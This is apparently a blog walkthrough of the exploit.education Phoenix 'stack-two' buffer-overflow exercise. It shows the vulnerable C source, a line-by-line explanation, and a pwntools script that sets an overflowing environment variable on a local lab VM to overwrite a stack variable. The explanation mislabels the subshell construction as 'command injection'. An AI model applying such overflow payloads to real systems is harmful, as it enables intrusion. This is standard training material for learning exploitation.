## Stack-Two

![](https://blog.cyb3rguru.tech/posts/phoenix/files/st2_header.png)

The source code provided:

### Source Code
---

```
/*
 * phoenix/stack-two, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * If you're Russian to get to the bath room, and you are Finnish when you get
 * out, what are you when you are in the bath room?
 *
 * European!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```
### Let's Dig in the code:
---
- The main() function is the entry point of the program.

- Inside the main() function, there is a definition of a structure named locals. It contains two members: buffer, an array of characters with a size of 64, and changeme, a volatile integer.

- A ptr variable of type char* is declared.

- The program prints the welcome message using printf().

- The program retrieves the value of the environment variable "ExploitEducation" using getenv() and assigns it to the ptr variable. If the variable is not set, an error message is displayed using errx().

- The changeme variable is initialized to 0.

- The strcpy() function is used to copy the value of ptr into locals.buffer. This is potentially unsafe since strcpy() does not perform bounds checking.

- After the strcpy() call, the program checks if changeme is equal to 0x0d0a090a. If true, it outputs a success message.

- If changeme is not equal to 0x0d0a090a, it displays a message showing the current value of changeme and the expected value.

- Finally, the program exits with a status code of 0.

### Solution
---
This challenge is very simlar to stack level one, but in this challenge we need to overflow the buffer, change the `changeme` struct variable to `0x0d0a090a` all from the environmental variable, using pwntools we could
accomplish this

```
#!/usr/bin/python
## script by Hamza Saidu
## cyberguru


from pwn import *

# connecting to the remote phoenix server
s = ssh(host='localhost', user='user', password='user', port=2222)

# sending exploit

message ="*"*20 + "setting environmental variable" + "*"*20
env_var = "ExploitEducation=$(python3 -c \"print('A'*64)\")$(echo '\x0a\x09\x0a\x0d')"
run_prog = "/opt/phoenix/amd64/stack-two"

print(s.run(f"printenv;echo {message};export {env_var};printenv;{run_prog}").recvall().decode())

```

Explanaiton of the code
---

```
from pwn import *
```
- The pwn library is imported, which provides functions for binary exploitation and interaction with remote services.

```
# connecting to the remote phoenix server
s = ssh(host='localhost', user='user', password='user', port=2222)
```
- An SSH connection is established to a server running on localhost with the username "user," password "user," and port 2222.

```
message ="*"*20 + "setting environmental variable" + "*"*20
```
- A string message is created, indicating the intention to set an environmental variable.

```
env_var = "ExploitEducation=$(python3 -c \"print('A'*64)\")$(echo '\x0a\x09\x0a\x0d')"
```
- An environmental variable named "ExploitEducation" is defined. The value of this variable is constructed using a command injection technique. It assigns the output of a Python command (print('A'*64)) to the variable, which generates a string of 64 'A' characters.

```
run_prog = "/opt/phoenix/amd64/stack-two"
```
- A variable named run_prog is set to the path of the program that will be executed on the remote server (/opt/phoenix/amd64/stack-two).

```
print(s.run(f"printenv;echo {message};export {env_var};printenv;{run_prog}").recvall().decode())

```
- The script is then executed on the remote server. It prints the current environment variables (printenv), displays the message, exports the env_var, prints the updated environment variables, and finally executes the program run_prog with the output of the command execution is received and printed.

So running the program we have:

![](https://blog.cyb3rguru.tech/posts/phoenix/files/st2_result.png)

